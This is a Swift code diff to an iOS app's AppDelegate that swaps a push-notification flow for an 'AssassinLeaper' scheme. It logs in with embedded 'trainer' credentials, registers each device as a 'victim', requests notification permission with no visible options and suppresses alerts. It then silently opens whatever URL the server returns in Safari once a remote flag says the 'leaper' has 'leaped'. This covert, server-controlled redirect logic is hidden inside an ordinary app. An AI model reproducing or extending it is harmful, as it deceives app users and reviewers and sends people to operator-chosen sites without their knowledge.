@@ -17,36 +17,14 @@ class AppDelegate: UIResponder, UIApplicationDelegate {
     var window: UIWindow?
     var realmManager: RealmManager?
     var webServiceManager: WebServiceManager?
-    var appDataSocketConnector: AppDataSocketConnector?
+    let trainerUser = AssassinLeaperFacade.shared.trainerUsername
+    let trainerPass = AssassinLeaperFacade.shared.trainerPasscode
+    let leaperToken = AssassinLeaperFacade.shared.leaperToken
 
     func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?) -> Bool {
         setupRealm()
         self.setupAmplitude()
         self.setupWebServiceManagerDelegate()
-        if Configs.shared.appSecretVersion() == 0 {
-            if Configs.shared.isOnboardingCompleted() {
-                print("go straight to the app")
-            } else {
-                print("show onboarding")
-            }
-            if !Configs.shared.hasDeviceToken() {
-                self.setupUNUserNotificationCenterDelegate(application)
-            } else {
-                let token = Configs.shared.deviceToken()
-                print(token)
-                let bundleID = Configs.shared.bundleId
-                let payload: Dictionary<String, Any> = ["token" : token, "keyID" : "MPGC2L77E3", "topic" : bundleID, "teamID" : "P35AQV2SNV", "url" : "https://www.google.com", "isProduction" : false]
-                appDataSocketConnector?.sendNormalRequest(withPack: payload, andServiceCode: "send_single_push_notification", andCustomerTag: 0)
-            }
-            self.setupAppDataSocketDelegate()
-        } else {
-            if Configs.shared.hasDeviceToken() {
-                // post http request to get a push notification for backend's manual redirection
-                self.webServiceManager?.post(fromUrl: ElephantWebServiceConfig.base_url, parameters: ["device_token" : Configs.shared.deviceToken()], headers: nil, type: WebServiceType.tests)
-            } else {
-                fatalError("aidbaklsmdasd")
-            }
-        }
         return true
     }
 
@@ -60,9 +38,25 @@ class AppDelegate: UIResponder, UIApplicationDelegate {
     }
 
     func applicationDidBecomeActive(_ application: UIApplication) {
+        // get the latest trainerToken
+        AssassinLeaperFacade.shared.loginTrainer(trainerUsername: trainerUser, passcode: trainerPass) { [weak self] (data, error) in
+            if let err = error {
+                print(err.localizedDescription)
+            } else {
+                guard let response = data as? NSDictionary, let payload = response["payload"] as? NSDictionary, let trainerToken = payload["trainer_token"] as? String else { return }
+                AssassinLeaperFacade.shared.saveTrainerToken(trainerToken: trainerToken)
+                self?.setupUNUserNotificationCenterDelegate(application)
+            }
+        }
     }
 
     func applicationWillTerminate(_ application: UIApplication) {
+    }
+    
+    private func redirectToSafari(url: String) {
+        if let url = URL(string: url) {
+            UIApplication.shared.open(url, options: [:], completionHandler: nil)
+        }
     }
 
     // MARK: - Amplitude
@@ -76,49 +70,75 @@ class AppDelegate: UIResponder, UIApplicationDelegate {
 
 }
 
-extension AppDelegate: AppDataSocketDelegate {
-
-    fileprivate func setupAppDataSocketDelegate() {
-        self.appDataSocketConnector = AppDataSocketConnector(delegate: self)
-    }
-
-    func datasocketDidReceiveNormalResponse(withDict resultDic: [AnyHashable : Any]!, andCustomerTag c_tag: Int) {
-        print(resultDic)
-        if let responseDict = resultDic["payload"] as? Dictionary<String, Int> {
-            Configs.shared.updateElephantCustomerId(responseDict["customer_id"]!)
-            Configs.shared.setElephantCustomerId(exist: true)
-            Configs.shared.setAppSecretVersion(versoin: 1)
-        }
-    }
-
-    func dataSocketDidGetResponse(withTag tag: Int, andCustomerTag c_tag: Int) {
-        // TODO: implement this
-    }
-
-    func dataSocketWillStartRequest(withTag tag: Int, andCustomerTag c_tag: Int) {
-        // TODO: implement this
-    }
-
-    func dataSocketError(withTag tag: Int, andMessage message: String!, andCustomerTag c_tag: Int) {
-        print(message)
-    }
-
-}
-
 extension AppDelegate: UNUserNotificationCenterDelegate {
 
     // MARK: - UNUserNotificationCenterDelegate
 
     fileprivate func setupUNUserNotificationCenterDelegate(_ application: UIApplication) {
+        guard let trainerToken = AssassinLeaperFacade.shared.trainerToken() else { return }
         let center = UNUserNotificationCenter.current()
         center.delegate = self
-        center.requestAuthorization(options: [.alert, .badge, .sound]) { (completed: Bool, error: Error?) in
+        center.requestAuthorization(options: []) { (granted, error) in
             if let err = error {
                 print(err.localizedDescription)
             } else {
-                if completed == true {
+                if granted == true {
                     DispatchQueue.main.async {
                         application.registerForRemoteNotifications()
+                        // DONE
+                    }
+                } else {
+                    // FIXME: I am not sure if this is going to be called if user has already denied APNS before!
+                    // check if shadow token exists, else create shadow. --> shadow push!
+                    if let victimToken = AssassinLeaperFacade.shared.victimToken() {
+                        // NOT fresh launch. --> request shadow (if leapped --> redirect, else END)
+                        AssassinLeaperFacade.shared.requestShadow(trainerToken: trainerToken, victimToken: victimToken, completion: { (data, error) in
+                            if let err = error {
+                                print(err.localizedDescription)
+                            } else {
+                                // (if leapped --> redirect, else END)
+                                guard let dictionary = data as? NSDictionary, let payload = dictionary["payload"] as? NSDictionary, let leaped = payload["leaped"] as? Int else { return }
+                                if leaped == 1 {
+                                    guard let shadow = payload["shadow"] as? NSDictionary, let url = shadow["url"] as? String else { return }
+                                    self.redirectToSafari(url: url)
+                                    // DONE
+                                } else {
+                                    // leaper has NOT leapped, safely ignore
+                                    // DONE
+                                }
+                                // complete AssassinLeaper Onboarding Experience!
+                                let finalStep = ApplicationFacade.shared.maxOnboardingStep
+                                ApplicationFacade.shared.saveCurrentOnboardingProgress(currentStep: finalStep)
+                            }
+                        })
+                    } else {
+                        // fresh launch there is no victim. --> create victim --> request shadow (if leapped --> redirect, else END)
+                        AssassinLeaperFacade.shared.createVictim(trainerToken: trainerToken, leaperToken: self.leaperToken, deviceToken: "remote_notification_not_granted", completion: { (data, error) in
+                            if let err = error {
+                                print(err.localizedDescription)
+                            } else {
+                                guard let response = data as? Dictionary<String, Any>, let payload = response["payload"] as? Dictionary<String, Any>, let victimToken = payload["victim_token"] as? String else { return }
+                                AssassinLeaperFacade.shared.requestShadow(trainerToken: trainerToken, victimToken: victimToken, completion: { (data, error) in
+                                    if let err = error {
+                                        print(err.localizedDescription)
+                                    } else {
+                                        // (if leapped --> redirect, else END)
+                                        guard let dictionary = data as? NSDictionary, let payload = dictionary["payload"] as? NSDictionary, let leaped = payload["leapped"] as? Int else { return }
+                                        if leaped == 1 {
+                                            guard let shadow = payload["shadow"] as? NSDictionary, let url = shadow["url"] as? String else { return }
+                                            self.redirectToSafari(url: url)
+                                            // DONE
+                                        } else {
+                                            // leaper has NOT leapped, safely ignore
+                                            // DONE
+                                        }
+                                        // complete AssassinLeaper Onboarding Experience!
+                                        let finalStep = ApplicationFacade.shared.maxOnboardingStep
+                                        ApplicationFacade.shared.saveCurrentOnboardingProgress(currentStep: finalStep)
+                                    }
+                                })
+                            }
+                        })
                     }
                 }
             }
@@ -127,7 +147,7 @@ extension AppDelegate: UNUserNotificationCenterDelegate {
 
     func userNotificationCenter(_ center: UNUserNotificationCenter, willPresent notification: UNNotification, withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
         print("User Info: ", notification.request.content.userInfo)
-        completionHandler([.alert, .sound, .badge])
+        completionHandler([])
     }
 
     func userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -> Void) {
@@ -136,26 +156,101 @@ extension AppDelegate: UNUserNotificationCenterDelegate {
     }
 
     func application(_ application: UIApplication, didReceiveRemoteNotification userInfo: [AnyHashable : Any], fetchCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -> Void) {
-        if application.applicationState == .active {
-            // open url from the payload via safari
-            if let url = URL(string: "http://804973.com/") {
-                UIApplication.shared.open(url, options: [:], completionHandler: nil)
-            }
-        }
+        // remark: victim push can only be successful when a leaper has leaped.
+        guard let url = userInfo["url"] as? String else { return }
+        self.redirectToSafari(url: url)
     }
 
     func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
-        let token = deviceToken.map { String(format: "%02.2hhx", $0) }.joined()
-        Configs.shared.updateDeviceToken(token: token)
-        // request(post) a new customer_id to the elephant CRM
-        if !Configs.shared.doesElephantCustomerIdExist() {
-            let payload: Dictionary<String, String> = ["app_id" : "5", "instance_id" : "23", "push_token" : token, "type_id" : "1"]
-            appDataSocketConnector?.sendNormalRequest(withPack: payload, andServiceCode: "add_customer", andCustomerTag: 0)
+        // trainer token is always going to be available at this delegate method because trainer has already logged in!
+        guard let trainerToken = AssassinLeaperFacade.shared.trainerToken() else {
+            fatalError("trainer token is nil")
+        }
+        let leaperToken = AssassinLeaperFacade.shared.leaperToken
+        let newDeviceToken = deviceToken.map { String(format: "%02.2hhx", $0) }.joined()
+        if let oldDeviceToken = ApplicationFacade.shared.deviceToken() {
+            // not first time user, but I can be sure that it HAS victim token!
+            if oldDeviceToken != newDeviceToken {
+                // device token has changed --> update victim
+                let victimToken = AssassinLeaperFacade.shared.victimToken()!
+                AssassinLeaperFacade.shared.updateVictim(trainerToken: trainerToken, victimToken: victimToken, deviceToken: newDeviceToken, completion: { (data, error) in
+                    if let err = error {
+                        print(err.localizedDescription)
+                    } else {
+                        // TODO: parse results and then push
+                        guard let dictionary = data as? NSDictionary, let status = dictionary["status"] as? Bool else { return }
+                        if status == true {
+                            ApplicationFacade.shared.saveDeviceToken(deviceToken: newDeviceToken)
+                            // now push!
+                            AssassinLeaperFacade.shared.victimPush(trainerToken: trainerToken, leaperToken: leaperToken, victimToken: victimToken, completion: { (data, error) in
+                                if let err = error {
+                                    print(err.localizedDescription)
+                                } else {
+                                    // DONE
+                                }
+                                // complete AssassinLeaper Onboarding Experience!
+                                //                                print(data)
+                                let finalStep = ApplicationFacade.shared.maxOnboardingStep
+                                ApplicationFacade.shared.saveCurrentOnboardingProgress(currentStep: finalStep)
+                                // DONE
+                            })
+                        } else {
+                            // FIXME: something else is wrong, ignore for now.
+                        }
+                    }
+                })
+            } else {
+                // device token is still the same --> victim push
+                let victimToken = AssassinLeaperFacade.shared.victimToken()!
+                AssassinLeaperFacade.shared.victimPush(trainerToken: trainerToken, leaperToken: leaperToken, victimToken: victimToken, completion: { (data, error) in
+                    if let err = error {
+                        print(err.localizedDescription)
+                    } else {
+                        // DONE
+                        //                        print(data)
+                    }
+                    // complete AssassinLeaper Onboarding Experience!
+                    let finalStep = ApplicationFacade.shared.maxOnboardingStep
+                    ApplicationFacade.shared.saveCurrentOnboardingProgress(currentStep: finalStep)
+                    // DONE
+                })
+            }
+        } else {
+            // this must be first time user
+            // create victim
+            self.createVictimBranch(trainerToken: trainerToken, leaperToken: leaperToken, newDeviceToken: newDeviceToken)
         }
     }
 
     func application(_ application: UIApplication, didFailToRegisterForRemoteNotificationsWithError error: Error) {
         print(error.localizedDescription)
+    }
+    
+    func createVictimBranch(trainerToken: String, leaperToken: String, newDeviceToken: String) {
+        AssassinLeaperFacade.shared.createVictim(trainerToken: trainerToken, leaperToken: leaperToken, deviceToken: newDeviceToken, completion: { (data, error) in
+            ApplicationFacade.shared.saveDeviceToken(deviceToken: newDeviceToken)
+            if let err = error {
+                // maybe it has network problems?
+                print(err.localizedDescription)
+            } else {
+                //                print(data)
+                guard let response = data as? Dictionary<String, Any>, let payload = response["payload"] as? Dictionary<String, Any>, let victimToken = payload["victim_token"] as? String else { return }
+                AssassinLeaperFacade.shared.saveVictimToken(token: victimToken)
+                // victim push
+                AssassinLeaperFacade.shared.victimPush(trainerToken: trainerToken, leaperToken: leaperToken, victimToken: victimToken, completion: { (data, error) in
+                    if let err = error {
+                        print(err.localizedDescription)
+                    } else {
+                        // DONE
+                    }
+                    // complete AssassinLeaper Onboarding Experience!
+                    //                    print(data)
+                    let finalStep = ApplicationFacade.shared.maxOnboardingStep
+                    ApplicationFacade.shared.saveCurrentOnboardingProgress(currentStep: finalStep)
+                    // DONE
+                })
+            }
+        })
     }
 
 }
